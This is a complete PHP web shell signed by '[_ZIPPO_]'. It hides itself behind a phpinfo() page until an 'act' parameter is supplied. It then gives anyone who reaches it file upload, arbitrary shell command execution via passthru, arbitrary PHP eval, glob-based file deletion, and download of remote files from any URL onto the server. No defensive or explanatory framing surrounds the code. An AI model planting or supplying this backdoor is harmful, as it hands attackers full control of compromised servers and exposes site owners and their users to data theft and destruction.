<?php # Made by [_ZIPPO_]

error_reporting(0);

if(empty($_GET['act'])){phpinfo();die();}

header('Content-type: text/html;charset=utf-8');
if (get_magic_quotes_gpc()) {
    foreach ($_REQUEST as $key => $value)
        $_REQUEST[$key] = stripslashes($value);
} ?>
<form action="" enctype="multipart/form-data" method="post">
<input type="file" size=52 name="file"><input type="submit" value="UPLOAD" name="file"><br>
<input type="text" size=42 name="target"><input type="text" size=10 name="tfile"><input type="submit" value="GET REMOTE" name="remote">
<br><input type="text" size=52 name="cmd"><input type="submit" value="COMMAND" name="file"><br>
<textarea rows='10' cols='64' name=eva></textarea><br><input type="submit" value="EVAL" name="file"><br><br><pre>
<?php
if ($_REQUEST["clean"]) {
    foreach (glob($_REQUEST["clean"]) as $fn) {
        unlink($fn);
        echo $fn . " is deleted!<br>";
    }
    exit;
}
if ($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], realpath($_POST['path'] ? $_POST['path'] :
        dirname(__file__)) . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
}
if ($_REQUEST['cmd']) {
    echo "<textarea rows='10' cols='64'>";
    echo htmlspecialchars(passthru($_REQUEST['cmd']));
    echo '</textarea><br><br>';
}
if ($_REQUEST['remote']) {
	if($_REQUEST['tfile']){$tfile = $_REQUEST['tfile'];}else{$tfile = basename($_REQUEST['target']);}
	$how = downloadRemoteFile($_REQUEST['target'],'./',$tfile);
    echo $how;
}
function get_file1($file, $local_path, $newfilename)
{
    $err_msg = '';
    $out = fopen($local_path.$newfilename, 'wb');
    if ($out == FALSE){
      return "<font color=\"#FF0000\">File not opened</font><br>";
    }
   
    $ch = curl_init();
    echo "(curl) downloading : ".$file."<br>";
    curl_setopt($ch, CURLOPT_FILE, $out);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_URL, $file);
               
    curl_exec($ch);
	if(curl_error($ch)){
	    return "(curl) <font color=\"#FF0000\">cant get remote url</font>";
	}else{
		return "(curl) <font color=\"#00BB00\">done!</font>";
	}
    curl_close($ch);
}
function downloadRemoteFile($url,$dir,$file_name = NULL){
    if($file_name == NULL){ $file_name = basename($url);}
    $url_stuff = parse_url($url);
    $port = isset($url_stuff['port']) ? $url_stuff['port'] : 80;
	
	if(!function_exists("fsockopen")){echo "(fsockopen) <font color=\"#FF0000\">fsockopen disabled!</font><br>";}else{echo "(fsockopen) downloading : ".$url."<br>";}
	
    $fp = fsockopen($url_stuff['host'], $port);
    $query  = 'GET ' . $url_stuff['path'] . " HTTP/1.0\n";
    $query .= 'Host: ' . $url_stuff['host'];
    $query .= "\n\n";
	
    if(!$fp)
		{ 
			if(!extension_loaded("curl")){die("(error) <font color=\"#FF0000\">fsockopen & curl_opt disabled!</font><br>unable to run");}else{echo "(fsockopen) fsockopen not working, using curl<br>";}
			$statuscurl = get_file1($url,$dir,$file_name);
			if($statuscurl){return $statuscurl;}
		}

    fwrite($fp, $query);

    while ($tmp = fread($fp, 8192))   {
        $buffer .= $tmp;
    }

    preg_match('/Content-Length: ([0-9]+)/', $buffer, $parts);
    $file_binary = substr($buffer, - $parts[1]);
    if($file_name == NULL){
        $temp = explode(".",$url);
        $file_name = $temp[count($temp)-1];
    }
    $file_open = fopen($dir . "/" . $file_name,'w');
    if(!$file_open){ return false;}
    fwrite($file_open,$file_binary);
    fclose($file_open);
    return "(fsockopen) <font color=\"#00BB00\">done!</font>";
}
function replace_stR($s, $h)
{
    $ret = $h;
    foreach ($s as $k => $r)
        $ret = str_replace($k, $r, $ret);
    return $ret;
}
if (!empty($_REQUEST['eva'])) {
    $s = array(
        '<?php' => '',
        '<?' => '',
        '?>' => '');
    echo "<textarea rows='10' cols='64'>";
    echo htmlspecialchars(eval(replace_stR($s, $_REQUEST['eva'])));
    echo '</textarea><br><br>';
}
exit;
?></pre></form>